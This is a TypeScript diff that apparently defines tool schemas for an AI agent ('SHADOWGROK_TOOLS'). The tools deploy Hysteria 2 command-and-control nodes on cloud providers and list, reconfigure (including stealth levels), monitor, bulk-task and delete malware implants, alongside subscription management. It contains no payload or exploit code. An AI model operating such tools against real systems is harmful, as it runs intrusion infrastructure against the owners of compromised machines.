@@ -284,17 +284,226 @@ export const SHADOWGROK_TOOLS: ToolDefinition[] = [
     type: "function",
     function: {
       name: "deploy_nodes",
-      description: "Deploy one or more Hysteria 2 C2 nodes to specified regions with given configuration. Returns node IDs, connection info, and deployment status.",
+      description: "Deploy Hysteria 2 C2 nodes to cloud providers (Vultr, Azure, Hetzner, DigitalOcean, AWS Lightsail). Provisions actual VPS instances, installs Hysteria2, and registers them in the database. Returns deployment ID for tracking progress.",
       parameters: {
         type: "object",
         properties: {
-          regions: { type: "array", items: { type: "string" }, description: "Target regions (e.g. ['us-east-1', 'eu-central-1'])" },
-          obfuscation: { type: "string", enum: ["salamander", "none"], default: "salamander" },
-          provider: { type: "string", enum: ["aws", "gcp", "azure", "digitalocean"], default: "aws" },
-          count_per_region: { type: "number", default: 1 },
-          auto_start: { type: "boolean", default: true }
+          provider: { 
+            type: "string", 
+            enum: ["hetzner", "digitalocean", "vultr", "lightsail", "azure"],
+            description: "Cloud provider to use for deployment" 
+          },
+          region: { type: "string", description: "Target region (provider-specific, e.g. 'ewr' for Vultr, 'eastus' for Azure)" },
+          size: { type: "string", description: "Instance size/plan (provider-specific, e.g. 'vc2-1c-1gb' for Vultr, 'Standard_B1s' for Azure)" },
+          name: { type: "string", description: "Node name (max 120 chars)" },
+          domain: { type: "string", description: "Optional domain for TLS (required for Let's Encrypt)" },
+          port: { type: "number", default: 443, description: "Hysteria2 listen port (default: 443)" },
+          obfs_password: { type: "string", description: "Obfuscation password (enables salamander obfs)" },
+          email: { type: "string", description: "Email for ACME/Let's Encrypt (required if using domain)" },
+          tags: { type: "array", items: { type: "string" }, description: "Tags for the node" },
+          bandwidth_up: { type: "string", description: "Upload bandwidth limit (e.g. '100 Mbps')" },
+          bandwidth_down: { type: "string", description: "Download bandwidth limit (e.g. '1 Gbps')" },
+          panel_url: { type: "string", description: "Panel URL for auth backend (default: derived from request)" }
         },
-        required: ["regions"]
+        required: ["provider", "region", "size", "name"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "get_deployment_status",
+      description: "Get the current status of a deployment initiated by deploy_nodes. Returns deployment status, steps completed, VPS ID/IP, and node ID if registered.",
+      parameters: {
+        type: "object",
+        properties: {
+          deployment_id: { type: "string", description: "Deployment ID returned by deploy_nodes" }
+        },
+        required: ["deployment_id"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "list_implants",
+      description: "List all implants with optional filtering by status, type, architecture, or node. Returns paginated results with implant details and health status.",
+      parameters: {
+        type: "object",
+        properties: {
+          status: { type: "string", enum: ["active", "inactive", "compromised"], description: "Filter by implant status" },
+          type: { type: "string", description: "Filter by implant type" },
+          architecture: { type: "string", description: "Filter by architecture (windows, linux, darwin)" },
+          node_id: { type: "string", description: "Filter by node ID" },
+          limit: { type: "number", default: 50, description: "Maximum number of results" },
+          offset: { type: "number", default: 0, description: "Offset for pagination" }
+        }
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "delete_implant",
+      description: "Delete an implant record. This removes the implant from the database but does not remotely uninstall it. Use with caution.",
+      parameters: {
+        type: "object",
+        properties: {
+          implant_id: { type: "string", description: "Implant ID to delete" },
+          force: { type: "boolean", default: false, description: "Force delete even if implant has active tasks" }
+        },
+        required: ["implant_id"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "update_implant_config",
+      description: "Update implant configuration including stealth settings, transport config, or metadata. Supports partial updates.",
+      parameters: {
+        type: "object",
+        properties: {
+          implant_id: { type: "string", description: "Implant ID to update" },
+          config_patch: { type: "object", description: "Partial config to merge (e.g. { stealth: { level: 'maximum' } })" },
+          transport_config_patch: { type: "object", description: "Partial transport config to merge" },
+          status: { type: "string", enum: ["active", "inactive", "compromised"], description: "Update implant status" }
+        },
+        required: ["implant_id"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "implant_health_monitor",
+      description: "Get detailed health metrics for implants including beacon history, task success rate, and anomaly detection. Returns health scores and recommendations.",
+      parameters: {
+        type: "object",
+        properties: {
+          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to monitor" },
+          time_range_hours: { type: "number", default: 24, description: "Time range for health analysis" },
+          include_recommendations: { type: "boolean", default: true, description: "Include health improvement recommendations" }
+        },
+        required: ["implant_ids"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "bulk_implant_operation",
+      description: "Execute a bulk operation on multiple implants at once (update config, change status, send task, etc.). Returns results for each implant.",
+      parameters: {
+        type: "object",
+        properties: {
+          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to target" },
+          operation: { type: "string", enum: ["update_config", "change_status", "send_task", "delete"], description: "Operation type" },
+          operation_params: { type: "object", description: "Operation-specific parameters" },
+          continue_on_error: { type: "boolean", default: true, description: "Continue with remaining implants if one fails" }
+        },
+        required: ["implant_ids", "operation"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "list_subscriptions",
+      description: "List all subscriptions with optional filtering by user, status, or tags. Returns subscription details and usage statistics.",
+      parameters: {
+        type: "object",
+        properties: {
+          user_id: { type: "string", description: "Filter by user ID" },
+          status: { type: "string", enum: ["active", "expired", "revoked", "suspended"], description: "Filter by status" },
+          tags: { type: "array", items: { type: "string" }, description: "Filter by tags" },
+          limit: { type: "number", default: 50, description: "Maximum number of results" },
+          offset: { type: "number", default: 0, description: "Offset for pagination" }
+        }
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "get_subscription",
+      description: "Get detailed information about a specific subscription including usage stats, metadata, and configuration.",
+      parameters: {
+        type: "object",
+        properties: {
+          subscription_id: { type: "string", description: "Subscription ID" },
+          token: { type: "string", description: "Alternatively, look up by token" }
+        }
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "delete_subscription",
+      description: "Delete a subscription permanently. This removes access immediately. Use revoke_subscription for safer access revocation.",
+      parameters: {
+        type: "object",
+        properties: {
+          subscription_id: { type: "string", description: "Subscription ID to delete" }
+        },
+        required: ["subscription_id"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "revoke_subscription",
+      description: "Revoke subscription access safely. Marks subscription as revoked with reason and timestamp. Can be undone by reactivating.",
+      parameters: {
+        type: "object",
+        properties: {
+          subscription_id: { type: "string", description: "Subscription ID to revoke" },
+          reason: { type: "string", description: "Reason for revocation (logged)" }
+        },
+        required: ["subscription_id"]
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "subscription_analytics",
+      description: "Get subscription analytics including usage trends, growth metrics, and performance data over a specified time range.",
+      parameters: {
+        type: "object",
+        properties: {
+          time_range_days: { type: "number", default: 30, description: "Time range in days for analytics" },
+          include_usage_breakdown: { type: "boolean", default: true, description: "Include per-subscription usage breakdown" }
+        }
+      }
+    }
+  },
+
+  {
+    type: "function",
+    function: {
+      name: "rotate_subscription_token",
+      description: "Rotate a subscription's access token for security. Invalidates old token and generates new one. Returns new token.",
+      parameters: {
+        type: "object",
+        properties: {
+          subscription_id: { type: "string", description: "Subscription ID to rotate token for" },
+          notify_user: { type: "boolean", default: true, description: "Send notification to user about token rotation" }
+        },
+        required: ["subscription_id"]
       }
     }
   }
